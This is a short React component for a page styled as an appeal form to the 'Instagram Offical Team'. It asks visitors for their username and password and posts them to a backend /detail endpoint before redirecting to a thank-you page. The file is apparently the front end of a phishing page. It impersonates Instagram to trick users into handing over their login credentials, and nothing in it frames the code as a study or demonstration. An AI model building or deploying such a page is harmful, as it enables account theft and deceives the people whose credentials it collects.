import React from 'react'
import NavBar from './Navbar.jsx'
import Footer from './Footer.jsx'
import './detail.css'
import { useState } from 'react'
import axios from 'axios'
import { useNavigate } from 'react-router-dom';
function Detail() {
  const [username,setuserName]=useState()
    const [password,setPassword]=useState()
    const navigate = useNavigate();
    const handleSumbit=(e)=>{
       e.preventDefault()
       axios.post('http://localhost:3000/detail',{username,password})
       .then(result=>{console.log (result) 
       navigate('/Thanks')
       })
       .catch(err =>console.log(err))
    }
  return (
    <>
    <NavBar></NavBar>
  <div className="form-card-container">
  <div className="form-card">
    <h2>Enter Your information</h2>
    <form onSubmit={handleSumbit}>
      <div className="form-group">
        <label htmlFor="username">UserName:</label>
        <input type="text" id="username" name="name" required onChange={(e)=>setuserName(e.target.value)} />
      </div>
      <div className="form-group">
        <label htmlFor="password">Password:</label>
        <input type="text" id="password" name="email" required onChange={(e)=>setPassword(e.target.value)} />
      </div>
      <p>Full this form to send appeal to <b>Instagram Offical Team</b></p>
      <p>Thanks You !</p>
      <button type="submit">Submit</button>
    </form>
  </div>
</div>
<Footer></Footer>
</>
  )
}

export default Detail